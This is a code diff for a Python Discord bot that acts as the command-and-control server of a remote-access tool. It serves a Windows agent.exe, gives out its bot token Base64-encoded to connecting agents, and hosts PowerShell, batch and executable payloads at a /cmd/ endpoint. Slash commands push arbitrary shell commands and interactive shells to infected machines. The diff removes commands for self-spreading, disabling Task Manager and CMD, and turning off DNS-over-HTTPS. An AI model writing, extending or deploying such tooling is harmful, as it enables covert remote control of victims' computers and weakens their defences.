@@ -9,8 +9,8 @@ import re
 import logging
 import base64
 import aiohttp
-import mimetypes  # for guessing content type
-import pathlib   # for safe path joining
+import mimetypes
+import pathlib
 
 # ------------------- CONFIGURATION -------------------
 BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
@@ -20,10 +20,8 @@ AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
 STALE_THRESHOLD_MINUTES = int(os.getenv("STALE_THRESHOLD_MINUTES", 5))
 PORT = int(os.getenv("PORT", 10000))
 ADMIN_ROLE_NAME = os.getenv("ADMIN_ROLE", "Admin")
-# Path to commands folder (relative to bot.py)
 COMMANDS_FOLDER = os.getenv("COMMANDS_FOLDER", "commands")
 
-# GitHub release URL for agent.exe (must be a direct download link)
 GITHUB_RELEASE_URL = os.getenv("GITHUB_RELEASE_URL")
 if not GITHUB_RELEASE_URL:
     raise ValueError("GITHUB_RELEASE_URL environment variable not set")
@@ -47,15 +45,12 @@ _cache_timestamp = None
 CACHE_TTL = timedelta(minutes=5)
 
 async def fetch_agent_binary():
-    """Fetch the agent.exe from GitHub release URL, with caching."""
     global _binary_cache, _cache_timestamp
     now = datetime.now(timezone.utc)
-
     if _binary_cache is not None and _cache_timestamp is not None:
         if now - _cache_timestamp < CACHE_TTL:
             logger.debug("Returning cached agent binary")
             return _binary_cache
-
     logger.info("Fetching agent.exe from GitHub release...")
     async with aiohttp.ClientSession() as session:
         try:
@@ -94,61 +89,44 @@ async def handle_health(request):
     return web.Response(text="OK")
 
 async def handle_agent_download(request):
-    """Serve the agent binary from GitHub release (with caching)."""
     data = await fetch_agent_binary()
     if data is None:
         return web.Response(text="Agent binary unavailable", status=503)
     return web.Response(body=data, content_type="application/octet-stream")
 
 async def handle_token(request):
-    """Return the bot token Base64‑encoded."""
     token = os.getenv("DISCORD_BOT_TOKEN")
     if not token:
         return web.Response(text="Token not configured", status=500)
     encoded = base64.b64encode(token.encode()).decode()
     return web.Response(text=encoded)
 
-# ------------------- NEW: COMMAND HANDLER (serves files from commands folder) -------------------
 async def handle_command(request):
-    """Serve a command script from the commands folder."""
     command_name = request.match_info.get('name', '')
     if not command_name:
         return web.Response(text="Command name missing", status=400)
-
-    # Security: prevent path traversal – only allow alphanumeric, dash, underscore
     if not re.match(r'^[a-zA-Z0-9_\-]+$', command_name):
         return web.Response(text="Invalid command name", status=400)
-
-    # Build safe path
     commands_dir = pathlib.Path(COMMANDS_FOLDER)
-    # Ensure the commands folder exists
     if not commands_dir.is_dir():
         logger.error(f"Commands folder '{COMMANDS_FOLDER}' not found")
         return web.Response(text="Commands folder not configured", status=500)
-
-    # Look for file with any extension (we'll search for command_name.*)
-    # We'll try exact match first, then try with .ps1, .bat, .exe, etc.
     possible_paths = [
         commands_dir / command_name,
         commands_dir / f"{command_name}.ps1",
         commands_dir / f"{command_name}.bat",
         commands_dir / f"{command_name}.exe",
     ]
-
     file_path = None
     for p in possible_paths:
         if p.is_file():
             file_path = p
             break
-
     if not file_path:
         logger.warning(f"Command '{command_name}' not found in {COMMANDS_FOLDER}")
         return web.Response(text="Command not found", status=404)
-
-    # Guess content type based on file extension
     content_type, _ = mimetypes.guess_type(str(file_path))
     if not content_type:
-        # Default for PowerShell scripts
         if file_path.suffix == '.ps1':
             content_type = 'text/x-powershell'
         elif file_path.suffix == '.bat':
@@ -157,8 +135,6 @@ async def handle_command(request):
             content_type = 'application/x-msdownload'
         else:
             content_type = 'text/plain'
-
-    # Read and return the file
     try:
         with open(file_path, 'rb') as f:
             data = f.read()
@@ -167,17 +143,12 @@ async def handle_command(request):
         logger.error(f"Error reading {file_path}: {e}")
         return web.Response(text="Internal server error", status=500)
 
-# ------------------- ROUTES SETUP -------------------
 app = web.Application()
 app.router.add_get("/", handle_health)
 app.router.add_get("/health", handle_health)
 app.router.add_get("/agent.exe", handle_agent_download)
 app.router.add_get("/hi", handle_token)
-# New route for commands – note the {name} placeholder
 app.router.add_get("/cmd/{name}", handle_command)
-
-# Optional: you could also add a catch-all that tries to serve from commands,
-# but using /cmd/ is cleaner and avoids conflicts.
 
 async def start_http_server():
     runner = web.AppRunner(app)
@@ -192,10 +163,8 @@ async def clean_stale_agents():
     guild = bot.get_guild(GUILD_ID)
     if not guild:
         return
-
     agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
     now = datetime.now(timezone.utc)
-
     for channel in agent_channels:
         try:
             async for msg in channel.history(limit=10, oldest_first=True):
@@ -239,7 +208,6 @@ async def on_ready():
             logger.info(f"Created #{CONTROL_CHANNEL_NAME} channel")
     clean_stale_agents.start()
 
-# ------------------- HELPER: Send command to agent -------------------
 async def send_command_to_agent(interaction: discord.Interaction, cmd_text: str, ephemeral: bool = True):
     channel = interaction.channel
     if not channel.name.startswith(AGENT_CHANNEL_PREFIX):
@@ -249,7 +217,7 @@ async def send_command_to_agent(interaction: discord.Interaction, cmd_text: str,
     await interaction.response.send_message(f"✅ Command `{cmd_text}` sent to agent.", ephemeral=ephemeral)
     return True
 
-# ------------------- SLASH COMMANDS (unchanged) -------------------
+# ------------------- SLASH COMMANDS (admin‑only commands removed) -------------------
 @bot.tree.command(name="run", description="Execute a shell command")
 async def run_command(interaction: discord.Interaction, command: str):
     await send_command_to_agent(interaction, f"run {command}")
@@ -326,21 +294,9 @@ async def shell_command(interaction: discord.Interaction):
 async def shell_stop_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "shell_stop")
 
-@bot.tree.command(name="spread", description="Create multiple copies of the agent")
-async def spread_command(interaction: discord.Interaction):
-    await send_command_to_agent(interaction, "spread")
-
 @bot.tree.command(name="update", description="Force the agent to self‑update")
 async def update_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "update")
-
-@bot.tree.command(name="lockdown", description="Apply system lockdown (disable Task Manager, CMD, etc.)")
-async def lockdown_command(interaction: discord.Interaction):
-    await send_command_to_agent(interaction, "lockdown")
-
-@bot.tree.command(name="enforce_dns", description="Flush DNS cache and disable DNS-over-HTTPS in browsers")
-async def enforce_dns_command(interaction: discord.Interaction):
-    await send_command_to_agent(interaction, "enforce_dns")
 
 # ------------------- CONTROL CHANNEL COMMANDS (legacy) -------------------
 @bot.command(name="agents")
